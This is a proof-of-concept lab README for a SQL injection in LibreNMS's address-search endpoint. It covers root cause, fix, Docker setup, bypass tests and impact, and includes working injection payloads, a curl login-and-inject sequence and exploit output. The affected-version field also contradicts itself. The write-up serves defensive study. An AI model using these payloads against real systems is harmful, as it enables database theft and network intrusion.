# CVE-2026-26988 - LibreNMS SQL Injection in Address Search

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2026-26988 |
| Component | [LibreNMS](https://github.com/librenms/librenms) |
| Type | CWE-89: SQL Injection |
| CVSS | 9.1 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| EPSS | 0.0% |
| Affected | LibreNMS ≤ 25.12.0 (all versions through 26.1.1) |
| Fix | [LibreNMS 26.2.0](https://github.com/librenms/librenms/commit/15429580baba03ed1dd377bada1bde4b7a1175a1) — complete rewrite with parameterized Eloquent controllers |
| Author | Exploit Intelligence Platform |
| Date | 2026-02-28 |

## Vulnerability Details

LibreNMS versions **25.12.0 and below** contain a critical SQL Injection vulnerability in the `ajax_table.php` endpoint when processing IPv4/IPv6 address search requests. The CIDR prefix portion of the `address` parameter is directly concatenated into a SQL `WHERE` clause without parameterization, allowing authenticated attackers to inject arbitrary SQL and extract full database contents — including SNMP community strings, device credentials, and user password hashes.

### Root Cause

The vulnerable file `includes/html/table/address-search.inc.php` splits the user-supplied `address` POST parameter on `/` into an address portion and a CIDR prefix. While the address portion is properly bound via `?` placeholders, the **prefix** is directly interpolated into the SQL query string inside single quotes:

```php
// Line 34 (IPv4 path):
$sql .= " AND ipv4_prefixlen='$prefix'";

// Line 52 (IPv6 path):
$sql .= " AND ipv6_prefixlen = '$prefix'";
```

A single quote in the prefix breaks out of the string literal, enabling arbitrary SQL injection. The attack is further facilitated by the fact that POST values pass through `includes/html/vars.inc.php` **without any sanitization** (unlike GET values, which are filtered through `strip_tags()`). Additionally, the `ajax_table.php` endpoint bypasses Laravel's CSRF middleware entirely, so no CSRF token is required — only a valid session cookie.

### Attack Chain

```
1. Authenticate to LibreNMS (any user role, including read-only)
2. POST to /ajax_table.php with id=address-search, search_type=ipv6
3. Set address parameter to: ::1/1' OR SLEEP(5)-- -
4. Prefix portion after '/' breaks out of SQL string literal
5. Injected SQL executes against MySQL — SLEEP confirms injection
6. Use conditional blind techniques to exfiltrate arbitrary data
```

### Fix

The fix (commit [`15429580ba`](https://github.com/librenms/librenms/commit/15429580baba03ed1dd377bada1bde4b7a1175a1)) takes a **complete rewrite approach**:

1. **Deletes** the vulnerable file `includes/html/table/address-search.inc.php` entirely
2. **Creates** three new Laravel Eloquent controllers with parameterized queries
3. **Routes** through Laravel middleware — new endpoints enforce CSRF protection
4. **Parameterizes** the CIDR prefix via Eloquent's `where()`:

```diff
- $sql .= " AND ipv6_prefixlen = '$prefix'";
+ $q->where($this->cidrField, $cidr);  // Bound parameter
```

No bypass was found. Twenty-six distinct bypass tests were executed against a patched container — all were blocked.

---

## Lab Setup

### Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        Docker Compose                           │
│                                                                 │
│  ┌──────────────────────┐  ┌─────────────┐  ┌───────────────┐  │
│  │ cve-2026-26988-      │  │ cve-2026-   │  │ cve-2026-     │  │
│  │ vulnerable           │  │ 26988-db    │  │ 26988-redis   │  │
│  │                      │  │             │  │               │  │
│  │ librenms/librenms:   │  │ mariadb:    │  │ redis:7.2-    │  │
│  │ 25.12.0              │  │ 10.11       │  │ alpine        │  │
│  │                      │  │             │  │               │  │
│  │ Web UI on :8000      │  │ MySQL 3306  │  │ Redis 6379    │  │
│  └──────────────────────┘  └─────────────┘  └───────────────┘  │
│                    lab-net (bridge)                              │
└─────────────────────────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2026-26988

# Start the lab
docker compose up -d

# Wait ~60 seconds for database migrations, then initialize:
bash init-lab.sh

# Run the exploit
python3 poc/poc.py localhost 8000 admin "Cvelab2026!sqli"

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2026-26988-vulnerable` | Target | `librenms/librenms:25.12.0` | `8000` | Vulnerable LibreNMS web application |
| `cve-2026-26988-db` | Database | `mariadb:10.11` | — | MySQL-compatible database backend |
| `cve-2026-26988-redis` | Cache | `redis:7.2-alpine` | — | Cache/session store |

### Default Credentials

| Service | Username | Password |
|---|---|---|
| LibreNMS Web UI | `admin` | `Cvelab2026!sqli` |
| MariaDB (app) | `librenms` | `librenms_pass` |
| MariaDB (root) | `root` | `rootpass` |

### Initialization Details

The `init-lab.sh` script:
1. Waits for the LibreNMS web UI to become responsive (up to 120s)
2. Removes the install wizard marker to prevent redirect
3. Creates the admin user
4. Seeds test data: a device (`lab-router`), port (`eth0`), and IPv4/IPv6 address entries (required for per-row SLEEP behavior)

### Stop / Reset

```bash
# Stop the lab (preserves data)
docker compose down

# Full reset (removes all volumes/data)
docker compose down -v
```

---

## PoC Usage

All PoC scripts are in `poc/` and use **Python 3 standard library only** (plus `curl` for authentication).

### Scripts

| Script | Purpose |
|--------|---------|
| `poc.py` | **Primary PoC** — IPv6 time-based + boolean-based blind SQLi |
| `poc_vector2.py` | IPv4 path — confirms both code paths are injectable |
| `poc_vector3.py` | Blind data extraction — exfiltrates `VERSION()`, `DATABASE()`, `CURRENT_USER()` |
| `bypass_poc.py` | Bypass test suite — 26 tests against patched container |
| `librenms_session.py` | Shared authentication module |

### Running the PoCs

```bash
# Primary PoC (IPv6 time-based + boolean-based blind SQLi)
python3 poc/poc.py localhost 8000 admin "Cvelab2026!sqli"

# IPv4 path verification
python3 poc/poc_vector2.py localhost 8000 admin "Cvelab2026!sqli"

# Blind data extraction (extracts DB version, name, user)
python3 poc/poc_vector3.py localhost 8000 admin "Cvelab2026!sqli"
```

### Expected Output (poc.py)

```
======================================================================
  CVE-2026-26988: LibreNMS <= 25.12.0 SQL Injection PoC
  Endpoint: /ajax_table.php (address-search, IPv6 prefix)
======================================================================

[*] Phase 1: Authentication
[+] Authenticated as 'admin'

======================================================================
TEST 1: BASELINE REQUEST (no injection)
======================================================================
[*] Sending normal IPv6 address search with prefix=64
    Payload: address=2001:db8::1/64
    Status:  200
    Time:    0.010s
    Total:   1 rows

======================================================================
TEST 2: TIME-BASED BLIND SQL INJECTION (SLEEP(5))
======================================================================
[*] Injecting time-based payload via IPv6 prefix
    Full address param: ::1/1' OR SLEEP(5)-- -
    SQL becomes: ... AND ipv6_prefixlen = '1' OR SLEEP(5)-- -'
    Expected delay: ~5+ seconds

    Status:  200
    Time:    10.013s

[+] VULNERABLE! Response took 10.01s (threshold: 4.0s)

======================================================================
TEST 3: BOOLEAN-BASED BLIND SQL INJECTION
======================================================================
[*] Sending TRUE condition: ::1/1' OR 1=1-- -
    Total:  1 | Rows returned: 1

[*] Sending FALSE condition: ::1/1' AND 1=2-- -
    Total:  0 | Rows returned: 0

[+] VULNERABLE! Boolean-based blind SQLi confirmed.

======================================================================
RESULTS SUMMARY
======================================================================
  Time-based SQLi:         CONFIRMED
  Boolean-based SQLi:      CONFIRMED

[+] CVE-2026-26988 CONFIRMED - SQL injection is exploitable!
```

### Manual Reproduction (curl)

```bash
# 1. Authenticate — get session cookie
TOKEN=$(curl -s -c cookies.txt "http://localhost:8000/login" | \
  grep -oP 'name="_token" value="\K[^"]+')

curl -s -b cookies.txt -c cookies.txt -L \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=Cvelab2026!sqli" \
  "http://localhost:8000/login"

# 2. Fire SQLi — time-based blind (expect ~10s delay)
time curl -s -b cookies.txt \
  -d "id=address-search&search_type=ipv6&current=1&rowCount=10" \
  --data-urlencode "address=::1/1' OR SLEEP(5)-- -" \
  "http://localhost:8000/ajax_table.php"
```

A response delay of **≥5 seconds** confirms the SQL injection.

---

## Verification: Vulnerable vs Patched

| Test | Vulnerable (25.12.0) | Patched (26.2.0) |
|------|---------------------|-------------------|
| **Baseline request** | 200 OK, 0.010s | 200 OK, 0.006s |
| **SLEEP(5) payload** | 200 OK, **10.013s** | 200 OK, **0.006s** |
| **Boolean TRUE (OR 1=1)** | total=**1** | empty body |
| **Boolean FALSE (AND 1=2)** | total=**0** | empty body |
| **Data extraction** | Extracts `10.11.16-mar`, `librenms` | No extraction possible |
| **Vulnerable file exists** | Present | Deleted |

The patched version returns immediately for all injection payloads because `address-search.inc.php` no longer exists. The replacement Eloquent controllers use fully parameterized queries.

---

## Bypass Analysis

**Result: No bypass found.** The fix is complete and robust.

Twenty-six bypass tests were performed across five categories:

| Category | Tests | Result |
|----------|-------|--------|
| Original PoC against deleted endpoint | 2 | All BLOCKED |
| Encoding bypasses on new endpoints | 8 | All BLOCKED |
| Alternative table files (`alerts`, `eventlog`) | 10 | All BLOCKED |
| LIKE wildcard injection | 1 | Not a security issue |
| Path manipulation (`file_exists` bypass) | 5 | All BLOCKED |

See `poc/bypass_poc.py` for the full test suite.

---

## Impact

An authenticated attacker (any LibreNMS user role, including read-only) can:

| Impact | Description |
|--------|-------------|
| **Database Exfiltration** | Extract all database contents — user password hashes, SNMP community strings, device credentials, API tokens |
| **File Read** | Read arbitrary server files via `LOAD_FILE()` (if MySQL FILE privilege is granted) |
| **File Write** | Write files via `INTO OUTFILE` (if write permissions exist) |
| **Privilege Escalation** | Extract admin password hashes or API tokens to escalate access |
| **Lateral Movement** | Use extracted SNMP strings and device credentials to pivot into monitored network infrastructure |
| **Denial of Service** | Heavy queries or `SLEEP()` to exhaust database connections |

---

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — IPv6 time-based + boolean-based blind SQLi |
| `poc/poc_vector2.py` | IPv4 path — confirms both code paths are injectable |
| `poc/poc_vector3.py` | Blind data extraction — exfiltrates VERSION(), DATABASE(), CURRENT_USER() |
| `poc/bypass_poc.py` | Bypass test suite — 26 tests against patched container |
| `poc/librenms_session.py` | Shared authentication module |
| `poc/reference_exploit.py` | Reference copy of public exploit #116383 |
| `docker-compose.yml` | Multi-container lab environment (LibreNMS + MariaDB + Redis) |
| `docker-compose-patched.yml` | Patched lab environment for bypass testing |
| `Dockerfile.patched` | Applies fix commit to base image |
| `init-lab.sh` | Lab initialization — creates admin user, seeds test data |
| `init-patched.sh` | Patched lab initialization |
| `patched-files/` | PHP files implementing the fix (Eloquent controllers) |

## References

| Resource | URL |
|----------|-----|
| **NVD Entry** | https://nvd.nist.gov/vuln/detail/CVE-2026-26988 |
| **GitHub Advisory** | https://github.com/librenms/librenms/security/advisories/GHSA-h3rv-q4rq-pqcv |
| **Fix Commit** | https://github.com/librenms/librenms/commit/15429580baba03ed1dd377bada1bde4b7a1175a1 |
| **Fix Pull Request** | https://github.com/librenms/librenms/pull/18777 |
| **Docker Image (vuln)** | https://hub.docker.com/r/librenms/librenms (`25.12.0`) |
| **Public Exploit** | https://github.com/mbanyamer/CVE-2026-26988-LibreNMS-SQLi |

## Timeline

| Date | Event |
|------|-------|
| 2025-12-15 | LibreNMS 25.12.0 released (last vulnerable version) |
| 2026-01-15 | Fix commit merged by Tony Murray |
| 2026-02-16 | LibreNMS 26.2.0 released (first patched version) |
| 2026-02-20 | CVE-2026-26988 published |
| 2026-02-28 | This PoC lab created and verified |

---

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2026-26988 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
